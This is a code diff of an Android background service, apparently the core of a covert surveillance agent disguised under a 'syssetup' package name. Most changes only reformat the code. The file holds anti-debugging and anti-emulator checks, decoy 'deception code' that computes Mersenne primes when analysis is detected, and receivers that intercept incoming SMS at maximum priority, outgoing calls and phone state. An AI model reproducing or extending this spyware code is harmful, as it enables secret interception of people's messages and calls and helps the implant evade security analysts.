@@ -9,6 +9,7 @@ import android.net.wifi.WifiManager;
 import android.os.IBinder;
 import android.widget.Toast;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.listener.BAc;
 import com.android.syssetup.listener.BC;
@@ -16,182 +17,179 @@ import com.android.syssetup.listener.BSm;
 import com.android.syssetup.listener.BSt;
 import com.android.syssetup.listener.WR;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 /**
  * The Class ServiceCore.
  */
 public class SMain extends Service {
-    private static final String TAG = "SMain"; //$NON-NLS-1$
+	private static final String TAG = "SMain"; //$NON-NLS-1$
+	public long mersenne;
+	BSt bst = new BSt();
+	BAc bac = new BAc();
+	BSm bsm = new BSm();
+	BC bc = new BC();
+	WR wr = new WR();
+	private Boolean listenersRegistered = false;
+	private Core core;
 
-    BSt bst = new BSt();
-    BAc bac = new BAc();
-    BSm bsm = new BSm();
-    BC bc = new BC();
-    WR wr = new WR();
-	private Boolean listenersRegistered=false;
-    private Core core;
+	public static boolean isPrime(long number) {
 
-    public long mersenne;
+		if ((number == 1) || (number == 2)) {
+			return true;
+		}
 
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+		for (int i = 2; i <= number / 2; i++) {
+			if (number % i == 0) {
+				return false;
+			}
+		}
 
-    @Override
-    public void onCreate() {
-        super.onCreate();
+		return true;
+	}
 
-        Status.setAppContext(getApplicationContext());
+	@Override
+	public IBinder onBind(Intent intent) {
+		return null;
+	}
 
-        // ANTIDEBUG ANTIEMU
-        if (!Core.checkStatic()) {
-            if (Cfg.DEBUG) {
-                Check.log(TAG + " (onCreate) anti emu/debug failed");
-            }
-	        if (Cfg.DEMO) {
-		        Status.self().makeToast(M.e("RUNNING"));
-	        }
+	@Override
+	public void onCreate() {
+		super.onCreate();
 
-            return;
-        }
+		Status.setAppContext(getApplicationContext());
 
-        bst = new BSt();
-        bac = new BAc();
-        bsm = new BSm();
-        bc = new BC();
-        wr = new WR();
+		// ANTIDEBUG ANTIEMU
+		if (!Core.checkStatic()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onCreate) anti emu/debug failed");
+			}
+			if (Cfg.DEMO) {
+				Status.self().makeToast(M.e("RUNNING"));
+			}
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
-        }
+			return;
+		}
 
-        if (Cfg.DEMO) {
-            Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-        }
-    }
+		bst = new BSt();
+		bac = new BAc();
+		bsm = new BSm();
+		bc = new BC();
+		wr = new WR();
 
-    private long deceptionCode3() {
-        long count = 0;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
+		}
 
-        for (long number = 2; number <= 360; number++) {
-            if (isPrime(number)) {
-                long mersennePrime = (long)(Math.pow(2, number)) - 1;
-                if (isPrime(mersennePrime)) {
-                    count += 1;
-                }
-            }
-        }
+		if (Cfg.DEMO) {
+			Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
 
-        return count;
-    }
+	private long deceptionCode3() {
+		long count = 0;
 
-    public static boolean isPrime(long number) {
+		for (long number = 2; number <= 360; number++) {
+			if (isPrime(number)) {
+				long mersennePrime = (long) (Math.pow(2, number)) - 1;
+				if (isPrime(mersennePrime)) {
+					count += 1;
+				}
+			}
+		}
 
-        if ((number == 1) || (number == 2)) {
-            return true;
-        }
+		return count;
+	}
 
-        for (int i = 2; i <= number/2; i++) {
-            if (number % i == 0) {
-                return false;
-            }
-        }
+	@Override
+	public void onStart(Intent intent, int startId) {
+		super.onStart(intent, startId);
 
-        return true;
-    }
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
+		}
 
-    @Override
-    public void onStart(Intent intent, int startId) {
-        super.onStart(intent, startId);
+		// ANTIDEBUG ANTIEMU
+		if (Core.checkStatic()) {
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onStart)"); //$NON-NLS-1$
-        }
+			// Core starts
+			core = Core.newCore(this);
+			core.Start(this.getResources(), getContentResolver());
 
-        // ANTIDEBUG ANTIEMU
-        if (Core.checkStatic()) {
+			registerReceivers();
 
-            // Core starts
-            core = Core.newCore(this);
-            core.Start(this.getResources(), getContentResolver());
+			if (Cfg.DEMO) {
+				Status.self().makeToast(M.e("DEMO AGENT RUNNING"));
+			}
 
-            registerReceivers();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart) anti emu/debug failed");
+				Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			}
 
-	        if (Cfg.DEMO) {
-		        Status.self().makeToast(M.e("DEMO AGENT RUNNING"));
-	        }
+			Thread thread = new Thread(new Runnable() {
+				@Override
+				public void run() {
+					Core.deceptionCode1();
+					mersenne = deceptionCode3();
+					Core.deceptionCode2(mersenne);
+				}
+			});
+			thread.start();
 
-        } else {
-            if (Cfg.DEBUG) {
-                Check.log(TAG + " (onStart) anti emu/debug failed");
-                Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-            }
+		}
+	}
 
-            Thread thread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    Core.deceptionCode1();
-                    mersenne = deceptionCode3();
-                    Core.deceptionCode2(mersenne);
-                }
-            });
-            thread.start();
+	@Override
+	public void onDestroy() {
+		super.onDestroy();
 
-        }
-    }
+		unregisterReceiver();
 
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
+		}
 
-        unregisterReceiver();
+		if (Cfg.DEMO) {
+			Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
-        }
-
-        if (Cfg.DEMO) {
-            Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-        }
-
-        core.Stop();
-        core = null;
-    }
+		core.Stop();
+		core = null;
+	}
 
 
-    private synchronized void registerReceivers() {
-        IntentFilter intentFilter = new IntentFilter();
-        registerReceiver(bst, intentFilter);
-        registerReceiver(bac, intentFilter);
+	private synchronized void registerReceivers() {
+		IntentFilter intentFilter = new IntentFilter();
+		registerReceiver(bst, intentFilter);
+		registerReceiver(bac, intentFilter);
 
-        IntentFilter iBsm = new IntentFilter();
-        iBsm.setPriority(999999999);
-        iBsm.addAction(M.e("android.provider.Telephony.SMS_RECEIVED"));
-        registerReceiver(bsm, iBsm);
+		IntentFilter iBsm = new IntentFilter();
+		iBsm.setPriority(999999999);
+		iBsm.addAction(M.e("android.provider.Telephony.SMS_RECEIVED"));
+		registerReceiver(bsm, iBsm);
 
-        IntentFilter iBc = new IntentFilter();
-        iBc.setPriority(0);
-        iBc.addCategory(M.e("android.intent.category.DEFAULT"));
-        iBc.addAction(M.e("android.intent.action.NEW_OUTGOING_CALL"));
-        iBc.addAction(M.e("android.intent.action.PHONE_STATE"));
-        registerReceiver(bc, iBc);
+		IntentFilter iBc = new IntentFilter();
+		iBc.setPriority(0);
+		iBc.addCategory(M.e("android.intent.category.DEFAULT"));
+		iBc.addAction(M.e("android.intent.action.NEW_OUTGOING_CALL"));
+		iBc.addAction(M.e("android.intent.action.PHONE_STATE"));
+		registerReceiver(bc, iBc);
 
-        // WiFi status manager
-        IntentFilter iWr = new IntentFilter();
-        iWr.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
-        iWr.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
-        registerReceiver(wr, iWr);
-	    listenersRegistered = true;
+		// WiFi status manager
+		IntentFilter iWr = new IntentFilter();
+		iWr.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
+		iWr.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
+		registerReceiver(wr, iWr);
+		listenersRegistered = true;
 
-    }
+	}
 
 	private synchronized void unregisterReceiver() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (unregisterReceiver)");
 		}
-		if(listenersRegistered){
+		if (listenersRegistered) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (un-registering)");
 			}
@@ -201,56 +199,56 @@ public class SMain extends Service {
 			unregisterReceiver(bc);
 			unregisterReceiver(wr);
 			listenersRegistered = false;
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (skipping already unregistered)");
 			}
 		}
 	}
 
-	public void stopListening(){
+	public void stopListening() {
 		unregisterReceiver();
 	}
 
-    @Override
-    public void onConfigurationChanged(Configuration newConfig) {
-        super.onConfigurationChanged(newConfig);
+	@Override
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
-        }
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
+		}
 
-    }
+	}
 
-    @Override
-    public void onLowMemory() {
-        super.onLowMemory();
+	@Override
+	public void onLowMemory() {
+		super.onLowMemory();
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
-        }
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
+		}
 
-    }
+	}
 
-    @Override
-    public void onRebind(Intent intent) {
-        super.onRebind(intent);
+	@Override
+	public void onRebind(Intent intent) {
+		super.onRebind(intent);
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
-        }
-    }
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
+		}
+	}
 
-    @Override
-    public boolean onUnbind(Intent intent) {
-        boolean ret = super.onUnbind(intent);
+	@Override
+	public boolean onUnbind(Intent intent) {
+		boolean ret = super.onUnbind(intent);
 
-        if (Cfg.DEBUG) {
-            Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
-        }
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
+		}
 
-        return ret;
-    }
+		return ret;
+	}
 
 
 }
